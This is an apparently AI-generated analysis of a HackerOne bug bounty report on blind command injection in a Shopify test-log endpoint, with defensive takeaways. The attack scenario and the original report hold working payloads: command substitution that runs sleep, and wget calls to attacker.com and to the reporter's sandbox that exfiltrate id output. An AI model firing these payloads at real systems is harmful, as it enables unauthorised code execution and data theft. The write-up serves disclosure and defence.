# Remote Code Execution via Command Injection in WPT EC2 Instance

## Metadata
- **Source:** HackerOne
- **Report:** 73567 | https://hackerone.com/reports/73567
- **Submitted:** 2015-07-02
- **Reporter:** prakharprasad
- **Program:** Shopify
- **Bounty:** Not specified in report
- **Severity:** critical
- **Vuln:** Command Injection, Code Injection, Unsafe Shell Metacharacter Handling
- **CVEs:** None
- **Category:** memory-binary

## Summary
A critical remote code execution vulnerability exists in http://wpt.ec2.shopify.com/ where user input in a filter parameter is directly evaluated as shell code without sanitization. Attackers can execute arbitrary commands by injecting shell metacharacters like backticks and command substitution syntax ($(...)).

## Attack scenario
1. Attacker identifies the testlog.php endpoint accepts a 'filter' parameter in the query string
2. Attacker crafts a payload using shell command substitution syntax: $(sleep 20) or $(`wget attacker.com/$(id)`)
3. Attacker submits the payload via the 'days' and 'filter' parameters in HTTP request
4. Backend code evaluates the filter parameter through an eval() or similar unsafe function call, executing the injected shell commands
5. Commands execute with the privileges of the web server process and results can be exfiltrated via out-of-band channels
6. Attacker confirms code execution by observing timing delays (sleep command) or receiving command output in web server logs

## Root cause
The application directly evaluates or processes user-supplied input from the 'filter' parameter without proper input validation, escaping, or sandboxing. The parameter likely passes through eval(), shell_exec(), passthru(), or similar PHP functions that interpret shell metacharacters.

## Attacker mindset
This is a straightforward injection attack targeting obvious input validation gaps. The attacker methodically tested basic shell syntax ($(...) and backticks) to confirm code execution, then weaponized it with command substitution to exfiltrate data. The blind RCE approach using out-of-band callbacks demonstrates pragmatic exploitation when direct output isn't available.

## Defensive takeaways
- Never use eval() or similar dynamic code evaluation functions on user input
- Avoid passing user input to shell execution functions (shell_exec, passthru, system, exec, backticks)
- Implement strict whitelist validation for filter parameters; only allow known, safe values
- Use parameterized queries and APIs that don't involve shell interpretation
- Apply input sanitization: remove or escape shell metacharacters (backticks, $, parentheses, semicolons, pipes)
- Run web application with minimal privileges (non-root user account)
- Implement Web Application Firewall (WAF) rules to detect command injection patterns
- Use static analysis tools to detect dangerous function calls during development

## Variant hunting
Search for similar patterns: other endpoints accepting 'filter', 'query', 'search', 'command', 'input', 'data' parameters that may be processed unsafely. Test for: semicolon command chaining (;), pipe operators (|), logical operators (&&, ||), variable expansion ($VAR), command substitution backticks, && and || operators. Check for eval() variants in PHP codebase and audit all shell_exec() calls.

## MITRE ATT&CK
- T1190 - Exploit Public-Facing Application
- T1059 - Command and Scripting Interpreter
- T1059.004 - Unix Shell
- T1203 - Exploitation for Client Execution

## Notes
This is a textbook command injection vulnerability with high exploitability due to being on a public-facing EC2 instance. The blind RCE methodology (using out-of-band callbacks to attacker-controlled servers) shows sophistication. The vulnerability allows complete system compromise as evidenced by successful id command execution. The report includes POC with actual command exfiltration.

## Full report
<details><summary>Expand</summary>

Hi,

I just found a remote code execution bug at http://wpt.ec2.shopify.com/

**Reproduction**

1. Open 
2. In the text area enter  **$(`sleep 20`)** and hit "Update List" 
3. The result should come out at around 20 seconds, there-by executing sleep command

POC:  http://wpt.ec2.shopify.com/testlog.php?days=1&filter=%24%28%60wget+sandbox.prakharprasad.com%2F%24%28id%29%60%29

I've attached a video for this RCE bug, in which I had executed **id** command for verification purpose on the server and sent back the result to my Apache logs, as the RCE here is blind.

Regards,
Prakhar Prasad




</details>

---
*Analysed by Claude on 2026-05-12*
